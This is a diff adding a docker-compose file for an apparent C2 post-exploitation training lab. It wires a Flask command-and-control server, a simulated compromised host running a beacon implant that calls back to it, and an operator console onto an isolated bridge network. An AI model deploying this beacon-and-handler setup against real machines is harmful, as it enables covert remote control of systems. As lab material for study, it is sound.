@@ -1,0 +1,33 @@
+services:
+  # C2 server — operator interface + implant handler
+  c2-server:
+    build: .
+    image: plaintext/c2-postex-lab
+    command: python3 -m flask --app server/c2_server.py run --host 0.0.0.0 --port 5000
+    networks:
+      - c2net
+
+  # Simulated "compromised" target host — runs the beacon implant
+  target:
+    build: .
+    image: plaintext/c2-postex-lab
+    command: python3 implant/beacon.py http://c2-server:5000 5 1
+    networks:
+      - c2net
+    depends_on:
+      - c2-server
+
+  # Operator console — runs the demo
+  operator:
+    build: .
+    image: plaintext/c2-postex-lab
+    command: sleep infinity
+    networks:
+      - c2net
+    depends_on:
+      - c2-server
+      - target
+
+networks:
+  c2net:
+    driver: bridge
